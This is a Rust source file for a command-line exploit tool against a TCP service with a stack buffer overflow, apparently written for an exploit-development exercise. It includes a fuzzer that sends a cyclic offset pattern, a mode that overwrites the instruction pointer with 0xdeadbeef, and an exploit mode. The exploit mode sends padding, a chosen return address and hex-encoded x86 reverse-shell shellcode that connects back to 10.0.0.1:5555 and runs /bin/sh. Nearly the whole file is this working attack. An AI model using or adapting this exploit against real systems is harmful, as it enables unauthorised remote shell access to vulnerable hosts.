use std::result::Result;
use std::io::{BufRead, BufReader, Write};
use std::net::{TcpStream, Shutdown};
use std::str;
use std::iter::repeat;
use clap::Parser;
use clap::error::Error as ClapError;
use serde::*;

fn friendly(mut stream: TcpStream) -> TcpStream {

    let length: u32 = 5;
    let message = "hello";
    stream
        .write(&length.to_le_bytes())
        .expect("Failed to write to server");

    stream
        .write(&message.as_bytes())
        .expect("Failed to write to server");

    let mut reader = BufReader::new(&stream);
    let mut buffer: Vec<u8> = Vec::new();
    reader
        .read_until(b'\n', &mut buffer)
        .expect("Could not read into buffer");
    print!(
        "{}",
        str::from_utf8(&buffer).expect("Could not write buffer as string")
    );
    stream
}

fn fuzzer(mut stream: TcpStream) -> TcpStream {

    let length: u32 = 2000;
    let offset_pattern: &str = "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAsyAszAB%ABsABBAB$ABnABCAB-AB(ABDAB;AB)ABEABaAB0ABFABbAB1ABGABcAB2ABHABdAB3ABIABeAB4ABJABfAB5ABKABgAB6ABLABhAB7ABMABiAB8ABNABjAB9ABOABkABPABlABQABmABRABoABSABpABTABqABUABrABVABtABWABuABXABvABYABwABZABxAByABzA$%A$sA$BA$$A$nA$CA$-A$(A$DA$;A$)A$EA$aA$0A$FA$bA$1A$GA$cA$2A$HA$dA$3A$IA$eA$4A$JA$fA$5A$KA$gA$6A$LA$hA$7A$MA$iA$8A$NA$jA$9A$OA$kA$PA$lA$QA$mA$RA$oA$SA$pA$TA$qA$UA$rA$VA$tA$WA$uA$XA$vA$YA$wA$ZA$xA$yA$zAn%AnsAnBAn$AnnAnCAn-An(AnDAn;An)AnEAnaAn0AnFAnbAn1AnGAncAn2AnHAndAn3AnIAneAn4AnJAnfAn5AnKAngA";

    let mut data: Vec<u8> = Vec::new();
    data.extend(length.to_le_bytes());
    data.extend(offset_pattern.as_bytes());

    stream
        .write(data.as_slice())
        .expect("Failed to write to server");

    stream
}

fn overwrite_eip(mut stream: TcpStream) -> TcpStream {
    
    let length: u32 = 2000;
    let bytes_until_eip: String = repeat('A').take(1040).collect();
    let overwritten_instruction_pointer_eip: u32 = 0xdeadbeef;
    let payload: String = repeat('Z').take(200).collect();

    let mut data: Vec<u8> = Vec::new();
    data.extend(length.to_le_bytes());
    data.extend(bytes_until_eip.as_bytes());
    data.extend(overwritten_instruction_pointer_eip.to_le_bytes());
    data.extend(payload.as_bytes());

    stream
        .write(data.as_slice())
        .expect("Failed to write to server");

    stream
}

fn exploit(mut stream: TcpStream, return_address: u32) -> TcpStream {

    let length: u32 = 2000;
    let bytes_until_eip: String = repeat('A').take(1040).collect();
    let overwritten_instruction_pointer_eip: u32 = return_address;
    let payload = hex::decode("31dbf7e35343536a0289e1b066cd809359b03fcd804979f9680a00010a68020015b389e1b066505153b30389e1cd8052686e2f7368682f2f626989e3525389e1b00bcd80").unwrap();

    let mut data: Vec<u8> = Vec::new();
    data.extend(length.to_le_bytes());
    data.extend(bytes_until_eip.as_bytes());
    data.extend(overwritten_instruction_pointer_eip.to_le_bytes());
    data.extend(payload.as_slice());

    stream
        .write(data.as_slice())
        .expect("Failed to write to server");

    stream
}

fn return_address_parser(return_address: &str) -> Result<u32, ClapError> {
    if return_address.len() != 8 {
        return Err(ClapError::raw(
            clap::error::ErrorKind::ValueValidation,
            "return address should have length of 8",
        ));
    }
    let decoded: Vec<u8> = hex::decode(return_address.to_string()).unwrap();
    let byte_array: [u8; 4] = decoded.try_into().expect("something went wrong");
    let u32_return_address = Some(u32::from_le_bytes(byte_array)).unwrap();
    Ok(u32_return_address)
}

#[derive(
    clap::ValueEnum, Clone, Debug, Serialize,
)]
#[serde(rename_all = "kebab-case")]
enum Command {
    Friendly,
    Fuzzer,
    EIP,
    Exploit
}

#[derive(Parser, Debug)]
#[command(name = "Exploit-Rust")]
#[command(version, about, long_about = "
   friendly - sends a regular message
   fuzzer - overflows the buffer with pattern 
   eip - overwrites the instruction pointer with deadbeef value
   exploit - overflows the buffer and executes a shellcode")]
struct Args {
    #[arg(value_enum)]
    command: Command,
    #[arg(help = "in url format <ip:port>, e.g. 127.0.0.1:3000")]
    host: String,
    #[arg(value_parser = return_address_parser, help = "in hex format, e.g. ffff0010")]
    return_address: u32
}

fn main() {
    let args = Args::parse();

    let mut stream = TcpStream::connect(args.host).expect("could not connect to server");

    use Command::*;
    stream = match args.command {
        Friendly => friendly(stream),
        Fuzzer => fuzzer(stream),
        EIP => overwrite_eip(stream),
        Exploit => exploit(stream, args.return_address),
    };
    stream.shutdown(Shutdown::Both).expect("shutdown call failed");
}
